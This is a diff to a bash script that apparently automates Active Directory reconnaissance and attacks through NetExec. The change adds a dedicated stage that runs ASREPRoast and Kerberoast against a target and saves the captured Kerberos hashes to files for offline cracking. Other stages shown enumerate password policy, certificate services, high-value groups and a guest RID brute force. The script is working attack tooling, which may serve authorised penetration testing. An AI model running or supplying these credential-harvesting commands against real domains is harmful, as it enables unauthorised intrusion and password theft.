@@ -411,14 +411,6 @@ run_nxc "LDAP password policy" \
     "${OUTPUT_DIR}/10_ldap_passpol" \
     ldap "$TARGET" "${AUTH_ARGS[@]}" --pass-pol
 
-run_nxc "ASREPRoast check (no pre-auth users)" \
-    "${OUTPUT_DIR}/10_asreproast" \
-    ldap "$TARGET" "${AUTH_ARGS[@]}" --asreproast "${OUTPUT_DIR}/asrep_hashes.txt"
-
-run_nxc "Kerberoastable accounts" \
-    "${OUTPUT_DIR}/10_kerberoast" \
-    ldap "$TARGET" "${AUTH_ARGS[@]}" --kerberoasting "${OUTPUT_DIR}/kerberoast_hashes.txt"
-
 run_nxc "MachineAccountQuota" \
     "${OUTPUT_DIR}/10_maq" \
     ldap "$TARGET" "${AUTH_ARGS[@]}" -M maq
@@ -426,6 +418,40 @@ run_nxc "MachineAccountQuota" \
 run_nxc "Find AD CS (certificate services)" \
     "${OUTPUT_DIR}/10_adcs" \
     ldap "$TARGET" "${AUTH_ARGS[@]}" -M adcs
+
+# ============================================================
+# STAGE 10b — ASREPRoast & Kerberoast
+# Run separately, bypassing run_nxc to avoid arg ordering
+# issues with hash output file paths. ASREPRoast requires
+# domain context (-d) for correct REALM in AS-REQ.
+# Kerberoasting requires valid credentials (needs a TGT).
+# ============================================================
+section "STAGE 10b: ASREPRoast & Kerberoast"
+
+ASREP_OUT="${OUTPUT_DIR}/asrep_hashes.txt"
+KERB_OUT="${OUTPUT_DIR}/kerberoast_hashes.txt"
+
+echo ""
+echo -e "${YELLOW}[*] ASREPRoast check (no pre-auth users)${NC}"
+echo -e "    ${NXC_BIN} ldap ${TARGET} ${AUTH_ARGS[*]} --asreproast ${ASREP_OUT}"
+$NXC_BIN ldap "$TARGET" "${AUTH_ARGS[@]}" --asreproast "$ASREP_OUT" 2>/dev/null \
+    | tee "${OUTPUT_DIR}/10_asreproast.txt"
+if [ -s "$ASREP_OUT" ]; then
+    echo -e "${RED}[!!!] ASREPRoast hashes captured: ${ASREP_OUT}${NC}"
+else
+    echo -e "${YELLOW}[!] No ASREPRoast hashes found (or requires domain context — try adding -d <domain>)${NC}"
+fi
+
+echo ""
+echo -e "${YELLOW}[*] Kerberoastable accounts${NC}"
+echo -e "    ${NXC_BIN} ldap ${TARGET} ${AUTH_ARGS[*]} --kerberoasting ${KERB_OUT}"
+$NXC_BIN ldap "$TARGET" "${AUTH_ARGS[@]}" --kerberoasting "$KERB_OUT" 2>/dev/null \
+    | tee "${OUTPUT_DIR}/10_kerberoast.txt"
+if [ -s "$KERB_OUT" ]; then
+    echo -e "${RED}[!!!] Kerberoast hashes captured: ${KERB_OUT}${NC}"
+else
+    echo -e "${YELLOW}[!] No Kerberoastable accounts found (or requires valid domain creds)${NC}"
+fi
 
 # ============================================================
 # STAGE 11 — MSSQL (if port 1433 is open)
@@ -533,6 +559,7 @@ for grp in "Domain_Admins" "Administrators" "Enterprise_Admins" "Remote_Desktop_
         echo -e "${RED}[!!!] Members found in high-value group '${grp}': ${f}${NC}"
     fi
 done
+
 if grep -ql "SidTypeUser\|SidTypeGroup" "${OUTPUT_DIR}/04c_guest_rid_brute.txt" 2>/dev/null; then
     echo -e "${RED}[!!!] Guest RID brute yielded users/groups: ${OUTPUT_DIR}/04c_guest_rid_brute.txt${NC}"
 fi
